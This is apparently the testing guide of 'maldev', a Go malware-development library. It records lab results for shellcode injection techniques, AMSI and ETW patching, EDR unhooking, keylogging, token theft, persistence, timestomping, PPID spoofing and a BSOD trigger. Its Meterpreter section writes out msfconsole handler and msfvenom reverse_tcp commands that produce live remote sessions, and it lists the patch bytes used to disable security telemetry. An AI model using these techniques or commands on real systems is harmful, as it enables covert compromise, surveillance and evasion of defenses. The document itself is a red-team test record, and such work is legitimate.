# Testing Guide — maldev

## Overview

The maldev project uses a multi-layered testing strategy:

1. **Unit tests** (`go test ./...`) — 64 packages, 500+ tests
2. **VM integration tests** (MALDEV_INTRUSIVE=1 MALDEV_MANUAL=1) — privileged operations in isolated VMs
3. **x64dbg binary verification** (scripts/vm-test-x64dbg-mcp.go) — 75 tests reading actual memory bytes via debugger
4. **Meterpreter end-to-end** (scripts/x64dbg-harness/meterpreter_matrix/) — real shellcode → real MSF sessions on Kali
5. **BSOD verification** (scripts/vm-test-bsod.go) — crashes VM, restores snapshot

## Running Tests

```bash
# Local (safe, non-intrusive)
go build $(go list ./...)
go test $(go list ./... | grep -v scripts) -count=1 -short

# VM — all tests including intrusive
./scripts/vm-run-tests.sh windows "./..." "-v -count=1"

# VM — with manual/dangerous tests
MALDEV_INTRUSIVE=1 MALDEV_MANUAL=1 go test ./... -count=1 -timeout 300s

# x64dbg binary verification (from host)
go run scripts/vm-test-x64dbg-mcp.go

# BSOD test (from host — crashes VM!)
go run scripts/vm-test-bsod.go

# Meterpreter matrix (from host, needs Kali)
# See Meterpreter section below
```

## Test Gating

| Environment Variable | Purpose |
|---------------------|---------|
| `MALDEV_INTRUSIVE=1` | Enable tests that modify system state (hooks, patches, injection) |
| `MALDEV_MANUAL=1` | Enable tests that need admin + VM (real shellcode, service manipulation) |
| `MALDEV_TEST_USER` | Username for impersonation tests |
| `MALDEV_TEST_PASS` | Password for impersonation tests |

## Injection CallerMatrix

Tests every injection method × every syscall calling convention. 35 combinations tested.

| Method | WinAPI | NativeAPI | Direct | Indirect | Type |
|--------|--------|-----------|--------|----------|------|
| CreateThread | ✅ | ✅ | ✅ | ✅ | Self |
| EtwpCreateEtwThread | ✅ | ✅ | ✅ | ✅ | Self |
| CreateRemoteThread | ✅ | ✅ | ✅ | ✅ | Remote |
| RtlCreateUserThread | ✅ | ✅ | ✅ | ✅ | Remote |
| QueueUserAPC | ✅ | ✅ | ✅ | ✅ | Remote |
| NtQueueApcThreadEx | ✅ | ✅ | ✅ | ✅ | Remote |
| EarlyBirdAPC | ✅ | ✅ | ✅ | ✅ | Spawn |
| ThreadHijack | ✅ | ✅ | ⚠️ | ⚠️ | Spawn |
| CreateFiber | ⛔ | ⛔ | ⛔ | ⛔ | Self |

- ⚠️ ThreadHijack + Direct/Indirect: `NtGetContextThread`/`NtWriteVirtualMemory` fail with STATUS_DATATYPE_MISALIGNMENT — RSP alignment issue in syscall stubs
- ⛔ CreateFiber: deadlocks Go's M:N scheduler with real shellcode

### Standalone Injection Functions

| Function | Meterpreter Tested | Notes |
|----------|-------------------|-------|
| SectionMapInject | ✅ SESSION_OK | Remote, uses Caller |
| KernelCallbackExec | ✅ SESSION_OK | Remote, no Caller |
| PhantomDLLInject | ✅ SESSION_OK | Remote, no Caller |
| ThreadPoolExec | ✅ SESSION_OK | Local, no Caller |
| ModuleStomp | ✅ SESSION_OK | Local, needs CreateThread for execution |
| ExecuteCallback (EnumWindows) | ✅ SESSION_OK | Local, synchronous |
| ExecuteCallback (TimerQueue) | ✅ SESSION_OK | Local, timer thread |
| ExecuteCallback (CertEnumStore) | ✅ SESSION_OK | Local, synchronous (Kali session 48 confirmed) |
| SpawnWithSpoofedArgs | ✅ SPOOF_OK | Process arg spoofing — real args executed, fake visible |

## Meterpreter End-to-End

### Prerequisites

1. Kali VM running with MSF (ssh -p 2223 kali@localhost)
2. Windows VM with Defender exclusions
3. SSH key at `/tmp/vm_kali_key`

### Setup

```bash
# Start MSF handler on Kali (sleep 3600 keeps it alive)
ssh -i /tmp/vm_kali_key -p 2223 kali@localhost \
  'nohup msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z; sleep 3600" > /tmp/msf.log 2>&1 &'

# Wait 20s for MSF boot, then generate shellcode
ssh -i /tmp/vm_kali_key -p 2223 kali@localhost \
  'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw' > /tmp/msf_payload.bin

# Copy to VM
VBoxManage guestcontrol Windows10 copyto --target-directory "C:\Temp\" /tmp/msf_payload.bin
```

### Key Finding: MSF sleep trick

msfconsole exits when stdin closes (not a crash — EOF). `nohup`/`screen` don't help because they close stdin. Fix: add `sleep 3600` as the LAST MSF `-x` command. This is an MSF sleep (not bash), keeping the process alive while the handler runs.

### Results (2026-04-14)

22 unique meterpreter sessions established across all 21 injection techniques (including CertEnumStore). SpawnWithSpoofedArgs verified separately (not a shellcode injection — confirms PEB argument overwrite).

## Evasion Tests

### AMSI Patch

| Function | WinAPI | NativeAPI | Direct | Indirect | Bytes Verified |
|----------|--------|-----------|--------|----------|---------------|
| PatchScanBuffer | ✅ | ✅ | ✅ | ✅ | 31 C0 C3 (xor eax,eax; ret) |
| PatchOpenSession | ✅ | ✅ | ✅ | ✅ | Conditional jump flipped (JZ → JNZ) |
| PatchAll | ✅ | ✅ | ✅ | ✅ | Both ScanBuffer + OpenSession patched |

### ETW Patch

| Function | WinAPI | NativeAPI | Direct | Indirect | Bytes Verified |
|----------|--------|-----------|--------|----------|---------------|
| EtwEventWrite | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteEx | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteFull | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteString | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteTransfer | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| NtTraceEvent | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |

### Unhook

| Function | WinAPI | NativeAPI | Direct | Indirect | Verification |
|----------|--------|-----------|--------|----------|-------------|
| ClassicUnhook | ✅ | ✅ | ✅ | ✅ | Target: NtCreateSection, stub = 4C 8B D1 B8 |
| FullUnhook | ✅ | ✅ | ✅ | ✅ | All ntdll stubs = 4C 8B D1 B8 |

ClassicUnhook safelist: NtClose, NtCreateFile, NtReadFile, NtWriteFile, NtQueryVolumeInformationFile, NtQueryInformationFile, NtSetInformationFile, NtFsControlFile — all rejected to prevent Go runtime deadlock.

### Other Evasion

| Technique | Test | Verification |
|-----------|------|-------------|
| ACG Enable | TestACGBlocksRWX | VirtualAlloc(PAGE_EXECUTE_READWRITE) returns error after Enable() |
| BlockDLLs Enable | TestBlockDLLsPolicy | Process alive = policy set |
| Phant0m Kill | TestKillEventLogThreads | EventLog service threads terminated (TEB tag resolution) |
| Herpaderping Run | TestRunWithDecoy | Disk file = decoy content, not original payload |
| SleepMask Sleep | TestSleepMask_EncryptedDuringSleep | Bytes XOR-encrypted during sleep, restored after |
| AntiVM DetectVM | TestDetectVMInVirtualBox | Returns "VirtualBox" in VirtualBox VM |
| AntiVM DetectProcess | TestDetectVBoxProcess | Finds VBoxService.exe, VBoxTray.exe |

## BSOD

Tested via `scripts/vm-test-bsod.go`:
1. Launches harness via scheduled task (interactive session)
2. Harness calls `bsod.Trigger(nil)`
3. First tries `NtRaiseHardError` (intercepted on Win 10 22H2)
4. Falls back to `RtlSetProcessIsCritical(TRUE)` + `os.Exit(1)`
5. VM crashes with CRITICAL_PROCESS_DIED
6. Orchestrator restores INIT snapshot

## SSN Resolver Verification

All 4 resolvers return identical SSNs for the same function:

| Function | SSN | HellsGate | HalosGate | Tartarus | HashGate |
|----------|-----|-----------|-----------|----------|----------|
| NtAllocateVirtualMemory | 0x0018 | ✅ | ✅ | ✅ | ✅ |
| NtProtectVirtualMemory | 0x0050 | ✅ | ✅ | ✅ | ✅ |
| NtCreateThreadEx | 0x00C2 | ✅ | ✅ | ✅ | ✅ |
| NtClose | 0x000F | ✅ | ✅ | ✅ | ✅ |

Cross-validated: x64dbg reads SSN bytes from ntdll prologue (offset +4, +5) and compares with resolver output. All match.

## Collection

| Feature | Test | Verification |
|---------|------|-------------|
| Screenshot | TestCapture | PNG magic bytes 89 50 4E 47 |
| Screenshot bounds | TestDisplayBounds | Width/height > 0 |
| Clipboard read | TestReadText | No crash |
| Clipboard roundtrip | TestReadTextRoundtrip | Set-Clipboard → ReadText = exact match |
| Clipboard watch | TestWatch | Channel closes on context cancel |
| Keylog hook install | TestStart | Hook installs + channel open |
| Keylog capture | TestCaptureSimulatedKeystrokes | SendInput(VK_A) → KeyCode=0x41 |
| Keylog cancel | TestStartCancel | Channel closes on timeout |

## Token Operations

| Function | Test | Verification |
|----------|------|-------------|
| Steal (self) | TestStealSelf | Valid token from own PID |
| Steal (remote) | TestImpersonateTokenFromRemoteProcess | Steal notepad token + impersonate |
| OpenProcessToken | TestOpenProcessTokenSelf | Token handle non-zero |
| UserDetails | TestTokenUserDetails | Username non-empty |
| IntegrityLevel | TestTokenIntegrityLevel | Returns string (Medium/High/System) |
| Privileges | TestTokenPrivileges | At least one privilege listed |
| Enable/Disable | TestEnableDisablePrivilege | Round-trip toggle |
| ImpersonateToken | TestImpersonateToken | Token-based (no credentials) |

## Persistence

| Mechanism | Test | Verification |
|-----------|------|-------------|
| Registry Run key | TestSetAndGet + TestDelete | Full CRUD lifecycle (Set → Get → Exists → Delete) |
| Scheduler task | TestCreateAndDelete | Create → Exists=true → Delete → Exists=false |

## Cleanup

| Function | Test | Verification |
|----------|------|-------------|
| SelfDelete (script) | TestRunWithScriptInChild | Binary file removed from disk |
| Timestomp Set | TestSet | File mtime changed |
| Timestomp CopyFrom | TestCopyFrom | Destination times match source |
| Memory WipeAndFree | TestWipeAndFree | VirtualQuery returns MEM_FREE |

## PE Operations

| Function | Test | Verification |
|----------|------|-------------|
| BOF Load | TestLoad | Parses COFF headers, validates machine type |
| BOF Execute | TestExecuteNopBOF | Runs nop.o without crash |
| PE Parse | TestOpenValidPE | Sections, imports, exports parsed |
| PE Strip timestamp | TestSetTimestamp | Timestamp changed |
| PE Sanitize | TestSanitize | Pclntab F1FFFFFF wiped + sections renamed |
| PE Morph UPX | TestUPXMorph | Section names randomized |
| sRDI ConvertDLL | TestConvertDLL | Shellcode generated from DLL |

## Linux Testing

### Injection Methods

| Method | Test | Result | Verification |
|--------|------|--------|-------------|
| /proc/self/mem | TestProcMemSelfInject | ✅ | Child writes via /proc/self/mem, prints PROCMEM_OK |
| memfd_create | TestMemFDInject | ✅ | Creates anonymous fd, ForkExecs /bin/true ELF copy |
| ptrace | TestPtraceInject | ✅ | Spawns sleep target, attaches via ptrace, injects |
| purego (mmap+exec) | TestPureGoExec | ✅ | mmap RWX + direct call (no CGO) |
| procmem crash verify | TestProcMemVerification | ✅ | Injection → SIGSEGV = shellcode executed |

### Linux Debugger Equivalent

Instead of x64dbg, Linux verification uses:
- **`/proc/PID/maps`** — read memory layout, find RWX regions
- **`/proc/PID/mem`** — read/write process memory directly
- **GDB** (`gdb -p PID`) — available on Ubuntu VM for interactive debugging
- **strace** — trace syscalls (memfd_create, mmap, ptrace)

### Running Linux Tests

```bash
# On host (orchestrates VM)
./scripts/vm-run-tests.sh linux "./..." "-v -count=1"

# On Ubuntu VM directly
MALDEV_INTRUSIVE=1 MALDEV_MANUAL=1 go test $(go list ./... | grep -v scripts) -count=1 -timeout 120s
```

### Platform Test Summary

| Platform | Packages OK | FAIL | Injection Methods | Meterpreter |
|----------|------------|------|-------------------|-------------|
| Windows 10 (VM) | 64 | 0 | 9 methods × 4 callers + 12 standalone | 22 sessions |
| Ubuntu 25.10 (VM) | 26 | 0 | 4 methods (procmem, memfd, ptrace, purego) | N/A (Linux) |

## PPID Spoofing

The `c2/shell` package includes a PPID spoofer (`PPIDSpoofer`) that creates child processes under a fake parent via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.

| Function | Test | Result | Notes |
|----------|------|--------|-------|
| ParentPID | TestParentPID | ✅ | Returns parent PID of current process |
| NewPPIDSpoofer | TestNewPPIDSpoofer | ✅ | Constructor, default targets |
| FindTargetProcess | TestPPIDSpooferFunctional | ⚠️ SKIP | Exploit Guard blocks CreateProcess with spoofed parent on Win 10 22H2 |
| SysProcAttr | TestPPIDSpooferSysProcAttrNoTarget | ✅ | Error on missing target |

**Known Limitation:** Windows 10 22H2 with Exploit Guard / ASR rules blocks `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. The technique works on systems without these protections.

## Known Limitations

| Issue | Impact | Workaround |
|-------|--------|-----------|
| CreateFiber deadlocks Go scheduler | Cannot test with real shellcode in `go test` | Use standalone binary |
| ThreadHijack + Direct/Indirect | RSP alignment breaks NtGetContextThread | Use WinAPI or NativeAPI |
| Phant0m depends on EventLog state | May skip if threads untagged | Run immediately after VM restore |
| Clipboard needs Session 1 | guestcontrol = Session 0 | Run via scheduled task |
| Keylog singleton | Must wait 500ms between Start() calls | Sleep after cancel |
| findallmem after x64dbg attach | Returns 0 results | Use InitDebug or self-scan |
| Syscall stubs transient | Freed after Caller GC | Scan during execution, not after |
| MSF exits on stdin EOF | Handler dies after -r/-x commands | Add `sleep 3600` as last -x command |
| PPID spoofing blocked | Exploit Guard / ASR on Win 10 22H2 | Disable Exploit Guard or test on older OS |
| Ubuntu no host-only NIC | Cannot reach Kali for meterpreter | Add nic2 hostonly (requires VM shutdown) |
